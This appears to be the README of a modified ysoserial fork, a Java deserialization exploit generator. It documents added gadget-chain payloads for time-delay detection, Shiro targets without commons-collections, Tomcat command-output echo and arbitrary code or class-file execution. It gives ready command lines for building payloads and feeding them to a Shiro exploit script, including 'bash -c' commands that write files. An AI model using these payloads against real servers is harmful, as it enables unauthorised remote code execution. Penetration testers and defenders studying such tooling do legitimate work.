# 修改版ysoserial


## 一.新增时间延迟检测payload  

1.CommonsBeanutils1_Time  
2.CommonsCollections1_Time  
3.CommonsCollections2_Time  
4.CommonsCollections3_Time  
5.CommonsCollections4_Time  
6.CommonsCollections5_Time  
7.CommonsCollections6_Time  
8.CommonsCollections7_Time

Example:  
```java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1_Time 9000   #以ms为单位，9000表示延迟9秒```


## 二.新增无commons-collections依赖的commons-beanutils  
1.CommonsBeanutils1Shiro      #主要用于解决Shiro反序列化无commons-collections依赖问题。  

Reference:  
https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html


## 三.新增Tomcat回显payload
1.CommonsBeanutils1_TomcatEcho      #无commons-collections依赖的commons-beanutils回显  
2.CommonsBeanutils1Shiro_TomcatEcho    #无commons-collections依赖的commons-beanutils回显  

Example:  
```python shiro_exp.py `java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1Shiro_TomcatEcho | base64` ```  
需要在头部添加X-Protection字段执行命令
![image](https://github.com/M-Kings/ysoserial/blob/main/IMG/1.png)


Ps:    
目前只写了两个回显的例子，同理可实现其他payload的回显，懒得写了，后续再更新


## 四.扩展代码执行
1.code mode  
command以code:开头,传入需要执行的自定义代码  
Example:  
```java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 'code:Thread.currentThread().sleep(9000L);'```

1.class file mode  
command以classfile:开头,传入编译好的Exp的class文件  
Example:  
```java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 'classfile:exp.class'```

Reference:  
http://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/

## 五.解决命令管道、重定向符问题
原ysoserial不支持使用管道、重定向符，如以下命令是不行的:  
```java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 "echo 123 >/tmp/123"```

改了之后支持命令管道和重定向符问题,支持使用多参数命令传入:  
```java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 "bash" "-c" "echo 123 >/tmp/123"```
